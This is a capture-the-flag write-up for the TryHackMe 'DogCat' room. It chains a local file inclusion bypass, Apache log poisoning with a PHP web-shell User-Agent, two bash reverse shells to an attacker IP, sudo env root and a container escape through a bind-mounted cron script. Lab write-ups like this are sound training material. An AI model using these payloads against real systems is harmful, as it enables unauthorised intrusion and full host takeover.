# DogCat — TryHackMe Writeup

## Enumeration

Target: `10.113.177.173`

Nmap scan revealed two open ports:

```
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
```

The web application is a simple gallery that lets you choose between a dog and a cat. After selection, the URL looks like:

```
http://10.113.177.173/?view=dog
```

This immediately suggests a potential **Local File Inclusion (LFI)** vulnerability via the `view` parameter.

---

## LFI Discovery

A basic attempt to read `/etc/passwd` failed:

```
?view=../../../etc/passwd
```

Burp Suite revealed the reason: the server automatically appends `.php` to the value of `view`, so it tries to execute `passwd.php` instead of reading `passwd`.

### Bypass attempts

Common LFI bypass techniques were tried:

1. **PHP filter wrapper** — encode the file in base64 before execution:
   ```
   ?view=php://filter/convert.base64-encode/resource=dog/../index
   ```
2. **Double URL encoding** — bypass potential WAF inspection:
   ```
   ?view=%252e%252e%252f%252e%252e%252fetc%252fpasswd
   ```

Neither worked. The filter wrapper failed because `.php` was still appended, and double encoding did not help either.

### Parameter fuzzing

Since standard bypasses failed, the next step was to fuzz for a parameter that might disable the automatic `.php` suffix. Using `ffuf` with SecLists:

```bash
ffuf -u "http://10.113.177.173/?view=dog../../../../../etc/passwd&FUZZ=" \
     -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
     -mr "root:x:0:0"
```

Result:

```
ext    [Status: 200, Size: 1356, Words: 78, Lines: 39]
```

The `ext` parameter is the key. When it is supplied (even empty), the server no longer appends `.php`:

```
http://10.113.177.173/?view=dog../../../../../../etc/passwd&ext=
```

Response confirmed LFI — `/etc/passwd` was successfully read:

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
...
```

---

## From LFI to RCE — Log Poisoning

No SSH keys were available, so SSH access was not an option. However, LFI can be escalated to **Remote Code Execution** via **log poisoning**.

### How it works

PHP's `include()` executes any file it reads. Apache writes every request (including the `User-Agent` header) to `/var/log/apache2/access.log`. By injecting PHP code into the `User-Agent` header, we can poison the log file. When the log is then included via LFI, PHP executes our injected code.

### Step 1 — Poison the log

Send a request with a malicious `User-Agent`:

```
User-Agent: <?php system($_GET['cmd']); ?>
```

### Step 2 — Trigger execution

Include the poisoned log file and pass a command via the `cmd` parameter:

```
GET /?view=./dog/../../../../../var/log/apache2/access.log&ext=&cmd=bash%20-c%20'bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.128.18%2F4444%200%3E%261' HTTP/1.1
Host: 10.113.177.173
User-Agent: <?php system($_GET['cmd']); ?>
```

Note: the command must be URL-encoded (spaces → `%20`, `>` → `%3E`, etc.), otherwise Apache returns `400 Bad Request`.

### Step 3 — Catch the shell

Start a listener on the attacking machine:

```bash
nc -lvnp 4444
```

After the request, a reverse shell was received:

```
www-data@337b03a387d0:/var/www/html$
```

---

## Privilege Escalation — www-data → root

Standard enumeration was performed (`id`, `whoami`, `sudo -l`, SUID checks, capabilities).

The most interesting finding was `sudo -l`:

```
User www-data may run the following commands on 4565d9888427:
    (root) NOPASSWD: /usr/bin/env
```

`env` is listed on **GTFOBins** as a trivial privilege escalation vector. Since it can execute arbitrary programs, it can spawn a root shell:

```bash
sudo env /bin/sh
```

This granted a **root shell inside the container**.

---

## Container Escape

After becoming root, a filesystem search for flags was performed:

```bash
find / -type f \( -iname "*flag*" -o -iname "*user.txt*" -o -iname "*root.txt*" \) 2>/dev/null
```

Three flags were found:

- `/var/www/html/flag.php`
- `/var/www/flag2_QMW7JvaY2LvK.txt`
- `/root/flag3.txt`

The fourth flag was missing. The first hypothesis: **we are inside a Docker container**.

### Confirming the container

```bash
ls -la /.dockerenv
```

Output:

```
-rwxr-xr-x 1 root root 0 Nov 17 11:29 /.dockerenv
```

The presence of `/.dockerenv` confirms we are inside a Docker container. The final flag must be on the host machine, outside the container.

### Finding the escape vector

Since `docker.sock` was not present in `/var/run/`, the next step was to look for **shared directories** between the container and the host.

Checking `/opt/backups/`:

```bash
ls -la /opt/backups/
cat /opt/backups/backup.sh
```

Content of `backup.sh`:

```bash
#!/bin/bash
tar cf /root/container/backup/backup.tar /root/container
```

This directory is a **bind mount** — the host's `/root/container/backup` is mounted into the container as `/opt/backups`. The script is executed **on the host** by a cron job (likely every minute), and the constant updates to `backup.tar` confirmed this.

### Exploiting the shared script

Since we are root inside the container and the script is writable, we can replace it with a reverse shell payload:

```bash
printf '#!/bin/bash\nbash -i >& /dev/tcp/192.168.128.18/4445 0>&1\n' > /opt/backups/backup.sh
```

Start a listener on the attacking machine:

```bash
nc -lvnp 4445
```

Within a minute, the host's cron job executed the modified script, and a **root shell on the host machine** was received.

### Final flag

```bash
cat /root/flag4.txt
```

Room completed. ✅

---

## Summary of the attack chain

| Step | Technique |
|------|-----------|
| 1 | LFI via `view` parameter |
| 2 | Parameter fuzzing → discovered `ext` bypass |
| 3 | Log poisoning via `User-Agent` → RCE |
| 4 | `sudo env` → root inside container |
| 5 | Bind-mounted cron script → container escape |
| 6 | Root on host → final flag |

---

## Key takeaways

- **LFI is rarely a dead end.** Even if `/etc/passwd` doesn't work, fuzzing for parameters can reveal bypasses.
- **Log poisoning is a reliable LFI-to-RCE path** when logs are readable and `include()` is unfiltered.
- **`sudo` misconfigurations are everywhere.** Always check GTFOBins for allowed binaries.
- **Container escape often relies on shared resources** — mounted sockets, directories, or scripts executed by the host.
- **Temporal clues matter.** A file that updates every minute in a mounted directory is a strong indicator of a host-side cron job.
